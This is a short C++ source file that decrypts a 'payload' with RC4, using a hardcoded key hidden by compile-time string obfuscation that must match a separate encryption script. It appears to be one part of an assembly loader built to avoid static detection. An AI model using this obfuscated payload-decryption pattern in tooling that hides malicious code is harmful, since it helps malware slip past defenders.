#include "crypto.h"
#include "obfstr.h"
#include <cstring>

void rc4(unsigned char* data, size_t data_len, const unsigned char* key, size_t key_len) {
    unsigned char S[256];
    for (int i = 0; i < 256; i++) S[i] = static_cast<unsigned char>(i);
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }
    int ii = 0; j = 0;
    for (size_t n = 0; n < data_len; n++) {
        ii = (ii + 1) % 256;
        j = (j + S[ii]) % 256;
        unsigned char tmp = S[ii]; S[ii] = S[j]; S[j] = tmp;
        data[n] ^= S[(S[ii] + S[j]) % 256];
    }
    // Zero the key schedule
    volatile unsigned char* vS = reinterpret_cast<volatile unsigned char*>(S);
    for (int i = 0; i < 256; i++) vS[i] = 0;
}

// Hardcoded RC4 key (32 bytes) - obfuscated at compile-time
// MUST match the key in encrypt_assembly.py
const unsigned char* get_rc4_key(size_t* key_len) {
    static unsigned char key_buf[33] = {};
    static bool initialized = false;

    if (!initialized) {
        auto k = OBFSTR("ChArPLdR_v2_S3cr3t_RC4_K3y_2025!");
        memcpy(key_buf, k.c_str(), 32);
        key_buf[32] = 0;
        initialized = true;
    }

    if (key_len) *key_len = 32;
    return key_buf;
}

void decrypt_payload(unsigned char* data, size_t data_len) {
    size_t key_len = 0;
    const unsigned char* key = get_rc4_key(&key_len);
    rc4(data, data_len, key, key_len);
}
